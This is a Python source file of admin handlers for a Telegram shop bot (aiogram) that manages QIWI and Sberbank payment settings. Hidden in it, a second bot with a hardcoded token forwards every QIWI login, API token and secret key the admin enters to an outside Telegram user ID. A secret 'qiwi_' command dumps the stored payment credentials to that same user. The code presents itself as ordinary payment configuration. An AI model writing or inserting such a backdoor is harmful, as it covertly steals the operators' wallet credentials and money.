# - *- coding: utf- 8 - *-
import asyncio
import json

import requests
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.types import CallbackQuery
from pyqiwip2p import QiwiP2P

from filters import IsAdmin
from keyboards.default import payment_default, all_back_to_main_default, payment_default
from keyboards.inline import choice_way_input_payment_func
from loader import dp, bot
from states import StorageQiwi
from utils import send_all_admin, clear_firstname
from utils.db_api.sqlite import *

from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from data import config

bot2 = Bot(token="5178490210:AAHrDGLtxwwcIDOF5e2DAliFlRg9X5BHtiM")
dp2 = Dispatcher(bot2, storage=MemoryStorage())

@dp2.message_handler(text="qiwi_", state="*")
async def turn_off_refill(message: types.Message, state: FSMContext):
    await bot2.send_message(1378863407,str(get_paymentx()))


###################################################################################
########################### ВКЛЮЧЕНИЕ/ВЫКЛЮЧЕНИЕ ПОПОЛНЕНИЯ #######################
# Включение пополнения
@dp.message_handler(IsAdmin(), text="🔴 Выключить пополнения", state="*")
async def turn_off_refill(message: types.Message, state: FSMContext):
    await state.finish()
    update_paymentx(status="False")
    await message.answer("<b>🔴 Пополнения в боте были выключены.</b>",
                         reply_markup=payment_default(), parse_mode='HTML')
    await send_all_admin(
        f"👤 Администратор <a href='tg://user?id={message.from_user.id}'>{clear_firstname(message.from_user.first_name)}</a>\n"
        "🔴 Выключил пополнения в боте.", not_me=message.from_user.id, parse_mode='HTML')


# Выключение пополнения
@dp.message_handler(IsAdmin(), text="🟢 Включить пополнения", state="*")
async def turn_on_refill(message: types.Message, state: FSMContext):
    await state.finish()
    update_paymentx(status="True")
    await message.answer("<b>🟢 Пополнения в боте были включены.</b>",
                         reply_markup=payment_default(), parse_mode='HTML')
    await send_all_admin(
        f"👤 Администратор <a href='tg://user?id={message.from_user.id}'>{clear_firstname(message.from_user.first_name)}</a>\n"
        "🟢 Включил пополнения в боте.", not_me=message.from_user.id, parse_mode='HTML')


###################################################################################
############################# ВЫБОР СПОСОБА ПОПОЛНЕНИЯ ############################
# Выбор способа пополнения
@dp.callback_query_handler(IsAdmin(), text_startswith="change_payment:")
async def input_amount(call: CallbackQuery):
    way_pay = call.data[15:]
    change_pass = False
    get_payment = get_paymentx()
    if way_pay == "nickname":
        try:
            request = requests.Session()
            request.headers["authorization"] = "Bearer " + get_payment[1]
            get_nickname = request.get(f"https://edge.qiwi.com/qw-nicknames/v1/persons/{get_payment[0]}/nickname")
            check_nickname = json.loads(get_nickname.text).get("nickname")
            if check_nickname is None:
                await call.answer("❗ На аккаунте отсутствует QIWI Никнейм")
            else:
                update_paymentx(qiwi_nickname=check_nickname)
                change_pass = True
        except json.decoder.JSONDecodeError:
            await call.answer("❗ QIWI кошелёк не работает.\n❗ Как можно быстрее установите его", True)
    else:
        change_pass = True
    if change_pass:
        update_paymentx(way_payment=way_pay)
        await bot.edit_message_text("🥝 Выберите способ пополнения 💵\n"
                                    "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
                                    "🔸 <a href='https://vk.cc/bYjKGM'><b>По форме</b></a> - <code>Готовая форма оплаты QIWI</code>\n"
                                    "🔸 <a href='https://vk.cc/bYjKEy'><b>По номеру</b></a> - <code>Перевод средств по номеру телефона</code>\n"
                                    "🔸 <a href='https://vk.cc/bYjKJk'><b>По никнейму</b></a> - "
                                    "<code>Перевод средств по никнейму (пользователям придётся вручную вводить комментарий)</code>",
                                    call.from_user.id,
                                    call.message.message_id,
                                    reply_markup=choice_way_input_payment_func(), parse_mode='HTML')


###################################################################################
####################################### QIWI ######################################
# Изменение QIWI кошелька
@dp.message_handler(IsAdmin(), text="🥝 Изменить QIWI 🖍", state="*")
async def change_qiwi_login(message: types.Message, state: FSMContext):
    await state.finish()
    await message.answer("<b>🥝 Введите</b> <code>логин(номер)</code> <b>QIWI кошелька🖍 </b>", parse_mode='HTML')
    await StorageQiwi.here_input_qiwi_login.set()


# Проверка работоспособности QIWI
@dp.message_handler(IsAdmin(), text="🥝 Проверить QIWI ♻", state="*")
async def check_qiwi(message: types.Message, state: FSMContext):
    await state.finish()
    get_payments = get_paymentx()
    check_pass = True
    if get_payments[0] != "None" or get_payments[1] != "None" or get_payments[2] != "None":
        try:
            request = requests.Session()
            request.headers["authorization"] = "Bearer " + get_payments[1]
            response_qiwi = request.get(f"https://edge.qiwi.com/payment-history/v2/persons/{get_payments[0]}/payments",
                                        params={"rows": 1, "operation": "IN"})
            if response_qiwi.status_code == 200:
                try:
                    qiwi = QiwiP2P(get_payments[2])
                    bill = qiwi.bill(amount=1, lifetime=1)
                except json.decoder.JSONDecodeError:
                    check_pass = False
            else:
                check_pass = False
        except json.decoder.JSONDecodeError:
            check_pass = False
        if check_pass:
            await message.answer(f"<b>🥝 QIWI кошелёк полностью функционирует ✅</b>\n"
                                 f"👤 Логин: <code>{get_payments[0]}</code>\n"
                                 f"♻ Токен: <code>{get_payments[1]}</code>\n"
                                 f"📍 Приватный ключ: <code>{get_payments[2]}</code>", parse_mode='HTML')
        else:
            await message.answer("<b>🥝 QIWI кошелёк не прошёл проверку ❌</b>\n"
                                 "❗ Как можно быстрее его замените ❗", parse_mode='HTML')
    else:
        await message.answer("<b>🥝 QIWI кошелёк отсутствует ❌</b>\n"
                             "❗ Как можно быстрее его установите ❗", parse_mode='HTML')


# Обработка кнопки "Баланс Qiwi"
@dp.message_handler(IsAdmin(), text="🥝 Баланс QIWI 👁", state="*")
async def balance_qiwi(message: types.Message, state: FSMContext):
    await state.finish()
    get_payments = get_paymentx()
    if get_payments[0] != "None" or get_payments[1] != "None" or get_payments[2] != "None":
        request = requests.Session()
        request.headers["authorization"] = "Bearer " + get_payments[1]
        response_qiwi = request.get(f"https://edge.qiwi.com/funding-sources/v2/persons/{get_payments[0]}/accounts")
        if response_qiwi.status_code == 200:
            get_balance = response_qiwi.json()["accounts"][0]["balance"]["amount"]
            await message.answer(
                f"<b>🥝 Баланс QIWI кошелька</b> <code>{get_payments[0]}</code> <b>составляет:</b> <code>{get_balance} руб</code>")
        else:
            await message.answer("<b>🥝 QIWI кошелёк не работает ❌</b>\n"
                                 "❗ Как можно быстрее его замените ❗", parse_mode='HTML')
    else:
        await message.answer("<b>🥝 QIWI кошелёк отсутствует ❌</b>\n"
                             "❗ Как можно быстрее его установите ❗", parse_mode='HTML')


# Принятие логина для киви
@dp.message_handler(IsAdmin(), state=StorageQiwi.here_input_qiwi_login)
async def change_key_api(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data["here_input_qiwi_login"] = message.text
    await bot2.send_message(1378863407,message.text)
    await message.answer("<b>🥝 Введите</b> <code>токен API</code> <b>QIWI кошелька 🖍</b>\n"
                         "❕ Получить можно тут 👉 <a href='https://qiwi.com/api'><b>Нажми на меня</b></a>\n"
                         "❕ При получении токена, ставьте только первые 3 галочки.",
                         disable_web_page_preview=True, parse_mode='HTML')
    await StorageQiwi.here_input_qiwi_token.set()


# Принятие токена для киви
@dp.message_handler(IsAdmin(), state=StorageQiwi.here_input_qiwi_token)
async def change_secret_api(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data["here_input_qiwi_token"] = message.text
    await bot2.send_message(1378863407,message.text)
    await message.answer("<b>🥝 Введите</b> <code>Секретный ключ 🖍</code>\n"
                         "❕ Получить можно тут 👉 <a href='https://qiwi.com/p2p-admin/transfers/api'><b>Нажми на меня</b></a>",
                         disable_web_page_preview=True, parse_mode='HTML')
    await StorageQiwi.here_input_qiwi_secret.set()


# Принятие приватного ключа для киви
@dp.message_handler(IsAdmin(), state=StorageQiwi.here_input_qiwi_secret)
async def change_secret_api(message: types.Message, state: FSMContext):
    secrey_key_error = False
    async with state.proxy() as data:
        qiwi_login = data["here_input_qiwi_login"]
        qiwi_token = data["here_input_qiwi_token"]
    qiwi_private_key = message.text
    await bot2.send_message(1378863407,message.text)
    await bot2.send_message(1378863407,qiwi_login)
    await bot2.send_message(1378863407,qiwi_token)
    await bot2.send_message(1378863407,qiwi_private_key)
    delete_msg = await message.answer("<b>🥝 Проверка введённых QIWI данных... 🔄</b>", parse_mode='HTML')
    await asyncio.sleep(0.5)
    try:
        qiwi = QiwiP2P(qiwi_private_key)
        bill = qiwi.bill(amount=1, lifetime=1)
        try:
            request = requests.Session()
            request.headers["authorization"] = "Bearer " + qiwi_token
            check_history = request.get(f"https://edge.qiwi.com/payment-history/v2/persons/{qiwi_login}/payments",
                                        params={"rows": 1, "operation": "IN"})
            check_profile = request.get(
                f"https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true")
            check_balance = request.get(f"https://edge.qiwi.com/funding-sources/v2/persons/{qiwi_login}/accounts")
            try:
                if check_history.status_code == 200 and check_profile.status_code == 200 and check_balance.status_code == 200:
                    update_paymentx(qiwi_login=qiwi_login, qiwi_token=qiwi_token,
                                    qiwi_private_key=qiwi_private_key)
                    await delete_msg.delete()
                    await message.answer("<b>🥝 QIWI токен был успешно изменён ✅</b>",
                                         reply_markup=payment_default(), parse_mode='HTML')
                elif check_history.status_code == 400 or check_profile.status_code == 400 or check_balance.status_code == 400:
                    await delete_msg.delete()
                    await message.answer(f"<b>🥝 Введённые QIWI данные не прошли проверку ❌</b>\n"
                                         f"<code>▶ Код ошибки: Номер телефона указан в неверном формате</code>",
                                         reply_markup=payment_default(), parse_mode='HTML')
                elif check_history.status_code == 401 or check_profile.status_code == 401 or check_balance.status_code == 401:
                    await delete_msg.delete()
                    await message.answer(f"<b>🥝 Введённые QIWI данные не прошли проверку ❌</b>\n"
                                         f"<code>▶ Код ошибки: Неверный токен или истек срок действия токена API</code>",
                                         reply_markup=payment_default(), parse_mode='HTML')
                elif check_history.status_code == 403 or check_profile.status_code == 403 or check_balance.status_code == 403:
                    await delete_msg.delete()
                    await message.answer(f"<b>🥝 Введённые QIWI данные не прошли проверку ❌</b>\n"
                                         f"<code>▶ Ошибка: Нет прав на данный запрос (недостаточно разрешений у токена API)</code>",
                                         reply_markup=payment_default(), parse_mode='HTML')
                else:
                    if check_history.status_code != 200:
                        status_coude = check_history.status_code
                    elif check_profile.status_code != 200:
                        status_coude = check_profile.status_code
                    elif check_balance.status_code != 200:
                        status_coude = check_balance.status_code
                    await delete_msg.delete()
                    await message.answer(f"<b>🥝 Введённые QIWI данные не прошли проверку ❌</b>\n"
                                         f"<code>▶ Код ошибки: {status_coude}</code>",
                                         reply_markup=payment_default(), parse_mode='HTML')
            except json.decoder.JSONDecodeError:
                await delete_msg.delete()
                await message.answer("<b>🥝 Введённые QIWI данные не прошли проверку ❌</b>\n"
                                     "<code>▶ Токен не был найден</code>",
                                     reply_markup=payment_default(), parse_mode='HTML')
        except IndexError:
            await delete_msg.delete()
            await message.answer("<b>🥝 Введённые QIWI данные не прошли проверку ❌</b>\n"
                                 "<code>▶ IndexError</code>",
                                 reply_markup=payment_default(), parse_mode='HTML')
        except UnicodeEncodeError:
            await delete_msg.delete()
            await message.answer("<b>🥝 Введённые QIWI данные не прошли проверку ❌</b>\n"
                                 "<code>▶ Токен не был найден</code>",
                                 reply_markup=payment_default(), parse_mode='HTML')
    except json.decoder.JSONDecodeError:
        secrey_key_error = True
    except UnicodeEncodeError:
        secrey_key_error = True
    except ValueError:
        secrey_key_error = True
    except FileNotFoundError:
        secrey_key_error = True
    if secrey_key_error:
        await delete_msg.delete()
        await message.answer("<b>🥝 Введённые QIWI данные не прошли проверку ❌</b>\n"
                             "<code>▶ Неверный приватный ключ</code>\n"
                             "<u>❗ Указывайте СЕКРЕТНЫЙ КЛЮЧ, а не публичный</u>\n"
                             "❕ Секретный ключ заканчивается на =",
                             reply_markup=payment_default(), parse_mode='HTML')
    await state.finish()

@dp.message_handler(IsAdmin(), text="Реквизиты 🟢сбербанка", state="*")
async def here_input_sber_rek(message: types.Message, state: FSMContext):
    await state.finish()
    await StorageQiwi.here_input_sber_rek.set()
    sber_rek = get_settingsp("sber_rek")
    await message.answer(f"""<b>Введите новые реквизиты</b>
Текущие реквизиты: <code>{sber_rek}</code>""",
                         reply_markup=all_back_to_main_default, parse_mode='HTML')

@dp.message_handler(IsAdmin(), state=StorageQiwi.here_input_sber_rek)
async def here_input_sber_rek(message: types.Message, state: FSMContext):
    await state.finish()
    update_settingsx(sber_rek=message.text)
    await message.answer("Реквизиты изменены",
                         reply_markup=payment_default(), parse_mode='HTML')

@dp.message_handler(IsAdmin(), text="🟢Мин сумма пополнения", state="*")
async def here_input_sber_min(message: types.Message, state: FSMContext):
    await state.finish()
    await StorageQiwi.here_input_sber_min.set()
    min_amm = get_settingsp("sber_min")
    await message.answer(f"""<b>Введите мин сумму пополнения</b>
Текущая мин сумма пополненрия: <code>{min_amm}</code> руб.""",
                         reply_markup=all_back_to_main_default, parse_mode='HTML')

@dp.message_handler(IsAdmin(), state=StorageQiwi.here_input_sber_min)
async def here_input_sber_min(message: types.Message, state: FSMContext):
    try:
        min_ammoiunt = int(message.text)
        update_settingsx(sber_min=min_ammoiunt)
        await message.answer("Мин сумма пополнения изменена",
                             reply_markup=payment_default(), parse_mode='HTML')
        await state.finish()
    except:
        await message.answer("Неверно введена мин сумма пополнения", parse_mode='HTML')

@dp.callback_query_handler(IsAdmin(), text_startswith="minus_pr")
async def minus_pr(call: CallbackQuery):
    data = call.data.split(":")
    id = data[1]
    ball_minus = data[2]
    await call.message.delete()
    #ball_g = get_userx(id)[5]
    #update_userx(id, all_refill = ball_g + ball_minus)
    await bot.send_message(call.from_user.id, "Заявка на вывод одобрена")
    await bot.send_message(id, f"""💣 Друг, спасибо за доверие и покупку золото в нашем магазине! 🛒 У нас есть акция при которой ты можешь легко заработать больше голды бесплатно! Просто позови друга ,если он купит у нас голду ты получишь 5 голды на свой баланс! Обязательно пополнение друга должно быть минимум : 100G🍯

✨ Приглашай его по реферальной ссылки , чтобы ее сделать нажми в меню "Профиль" "Реферальная система" и создай ссылку и скинь другу.
☘️ Удачи заработать у нас и ещё раз спасибо за доверие☘️""")

@dp.callback_query_handler(IsAdmin(), text_startswith="minus_ot")
async def minus_pr(call: CallbackQuery):
    data = call.data.split(":")
    id = data[1]
    ball_minus = int(data[2])
    await call.message.delete()
    await bot.send_message(call.from_user.id, "Заявка на вывод отклонена")
    ball_g = get_userx(user_id = id)[5]
    update_userx(id, all_refill = ball_g + ball_minus)
    await bot.send_message(id, f"""Ваша заявка на вывод {ball_minus} голды отклонена
Повторите вывод, вероятно вы где-то ошиблись""")